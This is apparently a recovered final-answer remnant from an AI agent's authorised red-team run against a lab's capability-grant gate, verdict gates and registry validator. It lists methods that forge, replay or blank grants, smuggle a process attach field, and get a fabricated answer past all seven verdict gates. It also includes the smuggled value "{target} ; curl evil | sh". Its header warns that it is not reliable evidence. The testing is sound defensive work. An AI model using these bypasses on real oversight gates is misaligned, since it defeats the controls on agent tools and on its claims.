> RECOVERED 2026-10-04  from ~/.omp/agent/sessions/--D--Project-<private-tree>--/2026-10-01T15-49-39-407Z_01a0f828/GateRedTeam.md (142 lines).
> This is the agent final-answer REMNANT, not the report the dossier cites. Read
> docs/research/WORKER-REPORT-LOSS.md before treating any line here as evidence.

{
  "STATUS": "DONE",
  "report_path": "%USERPROFILE%/AppData/Local/Temp/w1-gateredteam.md",
  "report_bytes": 39003,
  "scratch_root": "%USERPROFILE%/AppData/Local/Temp/redteam/rt",
  "baseline": {
    "gate_selftest": "PASS 10/10",
    "mission_selftest": "PASS 15/15",
    "registry_selftest": "PASS 18 cases",
    "note": "All three suites green at baseline. Every 2026-09-30 fix holds against the four attacks the handoff names."
  },
  "findings": {
    "gate_ps1": {
      "count_attacked": 11,
      "refused": 3,
      "exploited": 8,
      "refused_detail": [
        "forged capability + recomputed hash -> exit=3 registry does not grant",
        "swapped target bytes -> exit=5",
        "in-place allowed[] edit, no recompute -> exit=5 hash mismatch"
      ],
      "exploited_detail": [
        "G-FS: whole grant hand-written, owner_word='', provenance='', never minted -> exit=0, verified_against_registry=true, target_bytes_verified=true. Check validates hash/allowed/bytes but never WHO authorised the grant.",
        "G4: target_bytes_verified=true emitted when target does not exist (gate.ps1:274 skips rehash on Test-Path fail; :284 returns $true unconditionally)",
        "G5: replay grant for a different object (edit target+target_sha256, recompute unkeyed hash) -> exit=0",
        "G6: blank owner_word + self-asserted provenance, recompute -> exit=0",
        "G7: -Registry is caller-controlled; caller names the 'authority'",
        "G8: Invoke-Escalate never checks NewWord non-empty -> exit=0, escalation_word='' on disk",
        "G9: TOCTOU - Check passes on deleted target, attacker plants bytes, caught only next round",
        "G10: rewrite grant.lane to a lane never granted -> exit=0"
      ],
      "default_grant_fact": "New-Grant filters lane+requires_verdict and never consults state, so dynamic.device.frida (absent), native.il2cpp.symbols (absent) and native.ghidra.emulate (blocked) are in EVERY fresh grant - including two with escalation_class=impossible",
      "mutation_testing": [
        "M1 delete registry cross-check -> CAUGHT",
        "M2 delete target re-hash -> CAUGHT",
        "M3 delete monotonic-subset check -> CAUGHT"
      ],
      "note": "The three previously-demonstrated attacks are genuinely covered. The eight new ones are covered by nothing: no control creates a grant without New, and no control deletes a target."
    },
    "seven_verdict_gates": {
      "count_attacked": 13,
      "refused": 4,
      "exploited": 9,
      "headline": "C1: complete confident wrong answer - every fact invented, no tool ran, both capabilities are IDA Pro, guards named that never ran -> 7/7 gates PASS, failed_gates=[], tier=confirmed",
      "independence": "Counts distinct evidence_source STRINGS, not instruments. IDA Pro carries two ('decompiler' + 'static-analysis') so one tool passes as two families -> confirmed. Ghidra same split.",
      "discharged": "Never checks a named guard appears in $Evidence. Naming 4 observed guards that never ran -> PASS discharged",
      "bounded_claim": "$hasLimits is a 5-token regex match; any token anywhere passes. '100% safe' and 'safe: no defects whatsoever, however...' both reach confirmed. $limits still computed and still compared to nothing.",
      "reachability": "Two unrelated capabilities with nothing consumed -> confirmed. 'a typed chain, not two disconnected results' is not checked.",
      "termination": "1 good round + 1 FAILED round -> state=DONE while emitting 'no failure forced a stop'. $couldStillHelp computed then never referenced.",
      "evidence_ids": "No gate reads an evidence id; a lie and an empty string both reach confirmed.",
      "refused_detail": [
        "observation: blocked capability in evidence -> FAIL observation",
        "process: ok=$false round correctly filtered by -eq $true",
        "bounded_claim: 'completely safe and invulnerable' refused",
        "uncertainty: empty QuestionType refused"
      ],
      "registry_substitution": "-Registry on mission.ps1 feeds Get-Verdict. Same file, 3 states flipped: blocked capability becomes admissible evidence, observation PASSes."
    },
    "attach_boundary": {
      "question": "Does gate.ps1 police the attach boundary or only the file boundary?",
      "answer": "File only. No process concept exists in the grant.",
      "grant_fields": "schema, case_id, lane, target, target_sha256, provenance, owner_word, granted_at, allowed, escalation, note, grant_sha256",
      "evidence": "One grant authorises both native.ida.decompile (fs_read+proc_spawn) and dynamic.device.frida (fs_write+proc_spawn+exec_target); both Check exit=0",
      "smuggle": "attach_pid=99999 + attach_to='any process on this host' added, hash recomputed -> Check exit=0. No allow-list of grant fields, so naming a process is not expressible.",
      "containment_gap": "containment is a mission.ps1 intake param, never passed to gate.ps1; grant.json has no containment field, so station_under_named_process_rule and isolated_vm grants are byte-identical. The declaration meant to keep an untrusted sample off the host is the one the gate does not record.",
      "r8_tautology": "registry-verify.py R8 is self-cancelling: implied is built with `if reach.get(eff): implied.append(eff)`, then missing = [e for e in implied if not reach.get(e)]. An effect is only implied if reach ALREADY declares it. Deleting each effect in turn: proc_spawn / exec_target / db_write / fs_write / net all R8-silent. All 5 members of EFFECTS unreachable via the mechanism meant to enforce them; R8 only fires via requires.net/admin (R6's job).",
      "recommendation": "An attach-mode fuzzer (WinAFL -A / DynamoRIO) needs a grant schema change before a capability entry. Adding it today puts a live-process blast radius behind a token minted about a file."
    },
    "registry_validator": {
      "intent_violations": 6,
      "clean_lying_registry": "rt/manifests/capabilities-LYING-CLEAN.json validates as REGISTRY CLEAN from rt/rtroot with six mutations: probe.command='exit 0'; negative_control that always exits 0; all does_not_prove -> ['nothing']; invoke.argv=['{target} ; curl evil | sh']; consumes a field nobody produces; success_when='ok probably'",
      "mechanisms": [
        "R2: probe.command truthiness - 'exit 0', ' ', 'true' all pass",
        "R5: exp is None / exp == 0 only - a control that can only succeed passes",
        "R3: does_not_prove non-empty list - ['nothing'] passes",
        "R10: joined-command check skipped for any arg starting with '{' - the registry's own placeholder syntax is the bypass",
        "R4: only cross-checks a consumer's type when key IS produced; naming an unproduced field is silent",
        "R10: success_when only tested non-empty; an unrecognised value means the gate at mission.ps1:363-364 runs NO declared-success test, leaving exit code as the only signal",
        "R10: pathlib.Path(script).exists() is CWD-relative - same registry reports 2 violations from rt/ and 0 from rt/rtroot/"
      ],
      "mutation_testing": [
        "V1 R2 off -> caught",
        "V3 R4 off -> caught",
        "V5 R6 off -> caught",
        "V6 R8 off -> caught",
        "V7 R9 off -> caught",
        "V8 R10 success_when off -> caught",
        "V9 R7 off -> caught",
        "V2 R3 proves half off -> NOT CAUGHT, selftest all-clear",
        "V4 R5 expect_exit half off -> NOT CAUGHT, selftest all-clear"
      ],
      "note": "R3-proves and R5-expect_exit DO fire correctly on real data; what is missing is selftest coverage for those two rule halves. Whole-rule ablation misses them; half-ablation finds them."
    },
    "negative_controls": {
      "count": 15,
      "prose_not_command": "12 of 15 first tokens are not on PATH; the other 3 name net-reverse/tools/trustcheck.mjs which does not exist",
      "executed_by_nothing": "grep for negative_control across smoke-all.ps1 / gate.ps1 / mission.ps1: no match. Only registry-verify.py reads it, and it only checks the string is present and expect_exit != 0.",
      "manual_run": [
        "bash -c 'decompile addr=0xDEADBEEF on the open session' -> exit=127",
        "bash -c 'drop SRUM from the image and re-run' -> exit=127",
        "bash -c 'run the harness and require the ground-truth comparison to decide the verdict' -> exit=127"
      ],
      "verdict": "All 15 pass for the wrong reason: they pass because the string is non-empty and the integer non-zero. A control that cannot be executed cannot fail."
    },
    "controls_failing_for_wrong_reason": {
      "mission": [
        "gate 3 observation -> always $true -> selftest still 'MISSION SELFTEST OK: 15 controls behaved.'",
        "gate 4 independence -> always $true -> selftest still OK",
        "gate 7 discharged -> always $true -> selftest still OK",
        "gate 5 bounded_claim -> always $true -> CAUGHT (only isolating control of the four)"
      ],
      "mechanism": "Every control naming gates 3/4/7 uses a claim with no limitation, so bounded_claim fails first and supplies the expected unresolved. bounded_claim is load-bearing for the APPEARANCE of three other controls and is the only one tested in isolation - exactly backwards.",
      "proof": "'the check is in main' -> failed=independence,bounded_claim ; 'the check is in main, but one reconstruction' -> failed=independence",
      "gate": [
        "gate.ps1:383-384 computes $g3code from $g3.code, but New-Grant returns keys ok,grant,allowed_count,exit - no 'code' key. The vacuity NOTE fires on every run and is wired to nothing.",
        "gate.ps1:406 formats with $c[0].PadRight($width); $width is never assigned in the file"
      ]
    },
    "reproduction": [
      "powershell -File redteam/rt/scripts/A-gate-attacks.ps1",
      "powershell -File redteam/rt/scripts/A2-gate-deep.ps1",
      "powershell -File redteam/rt/scripts/A3-forge-from-scratch.ps1",
      "powershell -File redteam/rt/scripts/D-cli-repro.ps1",
      "powershell -File redteam/rt/scripts/H-attach.ps1",
      "powershell -File redteam/rt/scripts/B-verdict-attacks.ps1",
      "powershell -File redteam/rt/scripts/B2-discharged.ps1",
      "powershell -File redteam/rt/scripts/B3-combo.ps1",
      "powershell -File redteam/rt/scripts/C-reach.ps1",
      "powershell -File redteam/rt/mroot/scripts/F-wrongreason.ps1",
      "powershell -File redteam/rt/mroot/scripts/G-regswap.ps1",
      "cd redteam/rt/rtroot && python scripts/registry-verify.py",
      "python redteam/rt/scripts/registry-verify.py --selftest"
    ],
    "method": "Scratch copies only. gate-fns.ps1 / lab-verdict.ps1 are the real scripts with ONLY the trailing `switch ($Action)` dispatch removed so New-Grant/Test-Grant/Get-Verdict/Get-Termination can be called directly - the same entry point the repo's own selftests use. No function body altered. Full tree copy at rt/mroot/ so mutations run against a correct $RepoRoot and the mission selftest's intake cases are not vacuous.",
    "read_only_compliance": "Nothing written inside either repo. debugger/scripts/mission.ps1 and <private-tree>/wiki/methods/skill-adoption-checklist.md both show modified, but both are siblings' concurrent work - my scratch copies hash identical to git HEAD (mission.ps1: 3f2dd87ec31c17fc0308e7d648cf4ced909214e0cac2d89e85ac2d9eca4bf8a2).",
    "summary_counts": {
      "surface": "gate.ps1 authority",
      "attacked": 11,
      "refused": 3,
      "exploited": 8
    }
  }
}